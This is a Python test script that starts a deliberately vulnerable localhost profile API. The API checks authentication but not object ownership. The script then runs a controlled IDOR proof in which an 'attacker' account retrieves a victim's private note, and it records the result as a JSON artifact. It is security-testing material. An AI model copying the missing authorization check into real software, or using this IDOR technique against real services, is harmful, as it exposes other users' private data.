from __future__ import annotations

import argparse
import hashlib
import json
import threading
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from urllib.error import HTTPError
from urllib.parse import urlparse
from urllib.request import Request, urlopen


ATTACKER_TOKEN = "controlx-attacker-token"
USERS = {
    "attacker": {
        "id": "attacker",
        "display_name": "Mallory",
        "email": "mallory@example.test",
        "private_note": "attacker-own-note",
    },
    "victim": {
        "id": "victim",
        "display_name": "Vera",
        "email": "vera@example.test",
        "private_note": "VICTIM-SECRET-7F3A",
    },
}


def _canonical_json(value: Any) -> str:
    return json.dumps(value, sort_keys=True, separators=(",", ":"))


def _sha256(value: Any) -> str:
    return hashlib.sha256(_canonical_json(value).encode("utf-8")).hexdigest()


class VulnerableProfileHandler(BaseHTTPRequestHandler):
    server_version = "ControlXFixture/1.0"

    def do_GET(self) -> None:  # noqa: N802 - stdlib handler method name
        parsed = urlparse(self.path)
        if parsed.path == "/health":
            self._json(200, {"ok": True})
            return

        if self.headers.get("authorization") != f"Bearer {ATTACKER_TOKEN}":
            self._json(401, {"error": "unauthorized"})
            return

        prefix = "/api/profiles/"
        if not parsed.path.startswith(prefix):
            self._json(404, {"error": "not found"})
            return

        requested_id = parsed.path[len(prefix) :]
        profile = USERS.get(requested_id)
        if profile is None:
            self._json(404, {"error": "profile not found"})
            return

        # Deliberately vulnerable fixture: authentication is checked, but the
        # requested object is never authorized against the authenticated user.
        self._json(200, profile)

    def log_message(self, _format: str, *_args: Any) -> None:
        return

    def _json(self, status: int, payload: dict[str, Any]) -> None:
        body = _canonical_json(payload).encode("utf-8")
        self.send_response(status)
        self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def _request(base_url: str, path: str, *, authenticated: bool = True) -> dict[str, Any]:
    headers = {"authorization": f"Bearer {ATTACKER_TOKEN}"} if authenticated else {}
    request = Request(
        f"{base_url}{path}",
        headers=headers,
        method="GET",
    )
    try:
        with urlopen(request, timeout=3) as response:  # noqa: S310 - localhost fixture only
            status = response.status
            body = json.loads(response.read().decode("utf-8"))
    except HTTPError as error:
        try:
            status = error.code
            body = json.loads(error.read().decode("utf-8"))
        finally:
            error.close()

    return {
        "request": {
            "method": "GET",
            "path": path,
            "authenticated_as": "attacker" if authenticated else None,
            "authorization": "Bearer [REDACTED]" if authenticated else None,
        },
        "response": {
            "status": status,
            "body": body,
            "body_sha256": _sha256(body),
        },
    }


def run_idor_proof() -> dict[str, Any]:
    server = ThreadingHTTPServer(("127.0.0.1", 0), VulnerableProfileHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    try:
        base_url = f"http://127.0.0.1:{server.server_port}"
        negative_control = _request(
            base_url, "/api/profiles/victim", authenticated=False
        )
        control = _request(base_url, "/api/profiles/attacker")
        exploit = _request(base_url, "/api/profiles/victim")
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=3)

    assertions = {
        "unauthenticated_request_rejected": negative_control["response"]["status"] == 401,
        "control_succeeds": control["response"]["status"] == 200,
        "control_returns_attacker_record": control["response"]["body"].get("id") == "attacker",
        "exploit_succeeds": exploit["response"]["status"] == 200,
        "exploit_returns_victim_record": exploit["response"]["body"].get("id") == "victim",
        "victim_private_data_exposed": exploit["response"]["body"].get("private_note")
        == USERS["victim"]["private_note"],
    }
    confirmed = all(assertions.values())

    return {
        "schema_version": 1,
        "proof_type": "idor_same_state_control",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "fixture": {
            "name": "vulnerable-profile-api",
            "transport": "ephemeral localhost HTTP",
            "seed_sha256": _sha256(USERS),
        },
        "shared_state": {
            "authenticated_actor": "attacker",
            "victim": "victim",
            "seed_is_identical_for_both_requests": True,
        },
        "negative_control": negative_control,
        "control": control,
        "exploit": exploit,
        "incremental_harm": {
            "victim": "victim",
            "unauthorized_fields_exposed": ["display_name", "email", "private_note"],
            "victim_secret_sha256": hashlib.sha256(
                USERS["victim"]["private_note"].encode("utf-8")
            ).hexdigest(),
        },
        "assertions": assertions,
        "verdict": "confirmed" if confirmed else "not_confirmed",
    }


def write_proof(path: Path) -> dict[str, Any]:
    proof = run_idor_proof()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(proof, indent=2) + "\n", encoding="utf-8")
    return proof


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Run ControlX's deterministic victim-centered IDOR proof."
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path("artifacts/idor-before.json"),
        help="Path for the machine-readable proof artifact.",
    )
    args = parser.parse_args()
    proof = write_proof(args.output)
    print(json.dumps(proof, indent=2))
    return 0 if proof["verdict"] == "confirmed" else 1


if __name__ == "__main__":
    raise SystemExit(main())
